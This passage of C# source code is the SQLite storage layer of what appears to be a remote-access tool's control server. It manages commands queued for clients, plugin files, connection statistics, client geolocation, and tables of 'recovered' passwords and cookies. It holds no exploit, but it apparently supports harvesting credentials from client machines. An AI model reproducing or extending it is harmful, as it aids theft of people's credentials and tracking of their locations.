                                using (var reader2 = command3.ExecuteReader())
                                {
                                    if (reader2.Read())
                                    {
                                        registeredDynamicCommand.PluginHash = (byte[]) reader2[0];
                                    }
                                    else
                                    {
                                        Logger.Error(
                                            $"The dynamic command {registeredDynamicCommand.Id} could not be loaded because the plugin with id {registeredDynamicCommand.PluginResourceId} was not found");
                                        continue;
                                    }
                                }
                            }

                            result.Add(registeredDynamicCommand);
                        }
                    }
                }

            return result;
        }

        public void RemoveDynamicCommand(int id)
        {
            Logger.Debug("Remove dynamic command with id {0}", id);

            lock (_transactionLock)
            {
                //Execute in same lock so it goes flawless
                RemoveDynamicCommandParameter(id);

                using (
                    var command =
                        new SqliteCommand($"DELETE FROM `DynamicCommand` WHERE Id={id}",
                            _sqliteConnection))
                    command.ExecuteNonQuery();

                using (
                    var command =
                        new SqliteCommand($"DELETE FROM `DynamicCommandEvent` WHERE DynamicCommandId={id}",
                            _sqliteConnection))
                    command.ExecuteNonQuery();
            }
        }

        public bool ClientCommandExecuted(int clientId, int commandId)
        {
            Logger.Debug("Check if client CI-{0} did execute command {1}", clientId, commandId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT count(*) FROM `DynamicCommandEvent` WHERE Status={(int) ActivityType.Sent} AND ClientId={clientId} AND DynamicCommandId={commandId}",
                            _sqliteConnection))
                {
                    var existsEntry = (long) command.ExecuteScalar() > 0;

                    if (existsEntry)
                        Logger.Debug("The client CI-{0} has already executed the command {1}", clientId, commandId);

                    return existsEntry;
                }
        }

        public void RemoveDynamicCommandParameter(int id)
        {
            Logger.Debug("Remove parameter of dynamic command {0}", id);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT ParameterDataId FROM `DynamicCommand` WHERE Id={id} LIMIT 1",
                            _sqliteConnection))
                using (var reader = command.ExecuteReader())
                    if (reader.Read())
                    {
                        string guidStr;
                        if (!reader.IsDBNull(0) && !string.IsNullOrEmpty(guidStr = reader.GetString(0)))
                            DataSystem.GetFile(new Guid(guidStr))?.Delete();
                    }
        }

        public FileInfo GetStaticCommandPlugin(int pluginId)
        {
            Logger.Debug("Get file path of static command plugin {0}", pluginId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT DataId FROM `StaticCommandPlugin` WHERE Id=@pluginId",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@pluginId", pluginId);

                    using (var reader = command.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            var fileInfo = DataSystem.GetFile(new Guid(reader.GetString(0)));
                            Logger.Debug("File path of static command plugin found: {0}", fileInfo.Name);
                            return fileInfo;
                        }

                        Logger.Debug("File path of static command plugin {0} not found", pluginId);
                        return null;
                    }
                }
        }

        public bool CheckIsStaticCommandPluginAvailable(byte[] hash, out int pluginId)
        {
            string hashString = null;

            if (Logger.IsDebugEnabled)
            {
                hashString = BitConverter.ToString(hash);
                Logger.Debug("Check if static command plugin with hash={0} is available", hashString);
            }

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT DataId, Id FROM `StaticCommandPlugin` WHERE Hash=@pluginHash LIMIT 1",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@pluginHash", hash);

                    using (var reader = command.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            pluginId = reader.GetInt32(1);
                            var pluginFile = DataSystem.GetFile(new Guid(reader.GetString(0)));

                            if (pluginFile?.Exists == true)
                            {
                                if (hashString != null)
                                    Logger.Debug("Static command plugin with hash={0} found", hashString);
                                return true;
                            }

                            if (hashString != null)
                                Logger.Debug("Static command plugin with hash={0} does not exist (file name: {1})", hashString, pluginFile?.Name);
                            return false;
                        }

                        if (hashString != null)
                            Logger.Debug("Static command plugin with hash={0} does not exist in the database", hashString);
                        pluginId = 0;
                        return false;
                    }
                }
        }

        public void AddStaticCommandPlugin(Guid dataId, byte[] pluginHash)
        {
            if (Logger.IsDebugEnabled)
                Logger.Debug("Store information about static command plugin with hash={0} in database (DataId={1:B})",
                    BitConverter.ToString(pluginHash), dataId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT INTO `StaticCommandPlugin` (DataId, Hash) VALUES (@dataId, @pluginHash)",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@pluginHash", pluginHash);
                    command.Parameters.AddWithValue("@dataId", dataId.ToString("N"));

                    command.ExecuteNonQuery();
                }
        }

        public int GetClientCount()
        {
            Logger.Debug("Get client count");

            lock (_transactionLock)
                using (var command = new SqliteCommand("SELECT COUNT(*) FROM Client", _sqliteConnection))
                    return (int) (long) command.ExecuteScalar();
        }

        public void NewClientConnected()
        {
            Logger.Debug("Add new client connected entry to statistics");

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT OR IGNORE INTO `NewClientsStatistic` (Timestamp, Count) VALUES (DATE(), 0); UPDATE `NewClientsStatistic` SET Count = Count + 1 WHERE Timestamp = DATE()",
                            _sqliteConnection)
                    )
                    command.ExecuteNonQuery();
        }

        public void ClientConnected(int id)
        {
            Logger.Debug("Add client connected entry to statistics");

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"INSERT INTO `ClientsConnected` (ClientId, Timestamp) SELECT {id}, DATE() WHERE NOT EXISTS(SELECT Id FROM `ClientsConnected` WHERE Id={id} AND Timestamp=DATE())",
                            _sqliteConnection)
                    )
                    command.ExecuteNonQuery();
        }

        private void CheckClientConnectedStatistics()
        {
            Logger.Debug("Check connected statistics");

            lock (_transactionLock)
                lock (_clientsConnectedUpdateLock)
                {
                    var clearTable = false;
                    using (
                        var command =
                            new SqliteCommand(
                                "SELECT Timestamp, COUNT(Timestamp) FROM `ClientsConnected` WHERE Timestamp < DATE() GROUP BY Timestamp",
                                _sqliteConnection)
                        )
                    {
                        using (var reader = command.ExecuteReader())
                            while (reader.Read())
                            {
                                using (
                                    var command2 =
                                        new SqliteCommand(
                                            $"INSERT INTO `ClientsConnectedStatistic` (Timestamp, Count) VALUES ('{reader.GetDateTime(0).ToString("yyyy-MM-dd", CultureInfo.InvariantCulture)}', {reader.GetInt32(1)})",
                                            _sqliteConnection))
                                    command2.ExecuteNonQuery();
                                clearTable = true;
                            }
                    }

                    if (clearTable)
                        using (
                            var command2 =
                                new SqliteCommand(
                                    "DELETE FROM `ClientsConnected` WHERE Timestamp < DATE()",
                                    _sqliteConnection))
                            command2.ExecuteNonQuery();
                }
        }

        public void AddDataEntry(int clientId, long length, Guid fileName, Guid dataMode, string entryName,
            bool isCsvData)
        {
            Logger.Debug("Add a new data entry bound to CI-{0}, with the length {1} and the fileName {2} ({3})", clientId, length, fileName, entryName);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"INSERT INTO `Data` (ClientId, Timestamp, Length, FileName, DataMode, EntryName, IsCsvData) VALUES ({clientId}, @now, {length}, '{fileName:N}', '{dataMode.ToString("N")}', @entryName, {(isCsvData ? 1 : 0)})",
                            _sqliteConnection)
                    )
                {
                    command.Parameters.AddWithValue("@now", DateTime.UtcNow);
                    command.Parameters.AddWithValue("@entryName", entryName);
                    command.ExecuteNonQuery();
                }
        }

        public List<DataEntry> GetDataEntries(bool checkFileExists)
        {
            Logger.Debug("Get all data entries");

            var result = new List<DataEntry>();
            lock (_transactionLock)
            {
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT Id,ClientId,Timestamp,Length,DataMode,EntryName{(checkFileExists ? ",FileName" : string.Empty)} FROM `Data`",
                            _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            if (checkFileExists && DataSystem.GetFile(new Guid(reader.GetString(6))) != null)
                                continue;

                            result.Add(new DataEntry
                            {
                                Id = reader.GetInt32(0),
                                ClientId = reader.GetInt32(1),
                                Timestamp = reader.GetDateTime(2),
                                Size = reader.GetInt64(3),
                                DataType = new Guid(reader.GetString(4)),
                                EntryName = reader.GetString(5)
                            });
                        }
                    }
                }

                using (
                    var command =
                        new SqliteCommand("SELECT ClientId,COUNT(ClientId) FROM `RecoveredPassword` GROUP BY ClientId",
                            _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            result.Add(new DataEntry
                            {
                                Id = -1,
                                ClientId = reader.GetInt32(0),
                                Timestamp = DateTime.UtcNow,
                                Size = reader.GetInt32(1),
                                DataType = new Guid("8AA38175-F8E5-45BD-AC6E-F541DE91D753"),
                                EntryName = "Passwords"
                            });
                        }
                    }
                }
            }

            return result;
        }

        public string GetDataEntryFileName(int id)
        {
            Logger.Debug("Get file name of data entry {0}", id);

            lock (_transactionLock)
                using (var command = new SqliteCommand($"SELECT FileName FROM `Data` WHERE Id={id}", _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        if (!reader.Read())
                            return null;

                        return DataSystem.GetFile(new Guid(reader.GetString(0))).FullName;
                    }
                }
        }

        public void RemoveDataEntries(List<int> dataIds)
        {
            Logger.Debug("Remove {0} data entries", dataIds.Count);

            lock (_transactionLock)
            {
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT FileName FROM `Data` WHERE Id IN ({string.Join(", ", dataIds.Select(x => x.ToString()).ToArray())})",
                            _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var file = DataSystem.GetFile(new Guid(reader.GetString(0)));
                            file?.Delete();
                        }
                    }
                }

                using (
                    var command =
                        new SqliteCommand(
                            $"DELETE FROM `Data` WHERE Id IN ({string.Join(", ", dataIds.Select(x => x.ToString()).ToArray())})",
                            _sqliteConnection))
                    command.ExecuteNonQuery();
            }
        }

        public void RemovePasswords(List<int> clients)
        {
            Logger.Debug("Remove passwords and cookies of {0} clients", clients.Count);

            lock (_transactionLock)
            {
                using (
                    var command =
                        new SqliteCommand(
                            $"DELETE FROM `RecoveredPassword` WHERE ClientId IN ({string.Join(", ", clients.Select(x => x.ToString()).ToArray())})",
                            _sqliteConnection))
                    command.ExecuteNonQuery();
                using (
                    var command =
                        new SqliteCommand(
                            $"DELETE FROM `RecoveredCookie` WHERE ClientId IN ({string.Join(", ", clients.Select(x => x.ToString()).ToArray())})",
                            _sqliteConnection))
                    command.ExecuteNonQuery();
            }
        }

        public void SetClientLocation(int clientId, LocationInfo locationInfo, string ipAddress)
        {
            Logger.Debug("Update geo location of client CI-{0}", clientId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT OR REPLACE INTO `GeoLocation` (ClientId, IpAddress, Country, CountryName, Region, City, Latitude, Longitude, ZipCode, Timezone) VALUES (@clientId, @ipAddress, @country, @countryName, @region, @city, @latitude, @longitude, @zipCode, @timezone)",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@clientId", clientId);
                    command.Parameters.AddWithValue("@ipAddress", ipAddress);
                    command.Parameters.AddWithValue("@country", locationInfo.Country);
                    command.Parameters.AddWithValue("@countryName", locationInfo.CountryName);
                    command.Parameters.AddWithValue("@region", locationInfo.Region);
                    command.Parameters.AddWithValue("@city", locationInfo.City);
                    command.Parameters.AddWithValue("@latitude", locationInfo.Latitude);
                    command.Parameters.AddWithValue("@longitude", locationInfo.Longitude);
                    command.Parameters.AddWithValue("@zipCode", locationInfo.ZipCode);
                    command.Parameters.AddWithValue("@timezone", locationInfo.Timezone);
                    command.ExecuteNonQuery();
                }
        }

        public List<ClientLocation> GetClientLocations(List<int> clients)
        {
            Logger.Debug("Get geo locations of {0} clients", clients.Count);

            var result = new List<ClientLocation>();
            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT * FROM `GeoLocation` WHERE ClientId IN ({string.Join(", ", clients)})",
                            _sqliteConnection))
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        result.Add(new ClientLocation
                        {
                            ClientId = reader.GetInt32(0),
                            IpAddress = reader.GetString(1),
                            Country = reader.GetString(2),
                            CountryName = reader.GetString(3),
                            Region = reader.GetString(4),
                            City = reader.GetString(5),
                            Latitude = reader.GetFloat(6),
                            Longitude = reader.GetFloat(7),
                            ZipCode = reader.GetString(8),
                            Timezone = reader.GetInt32(9)
                        });
                    }
                }

            return result;
        }
    }
}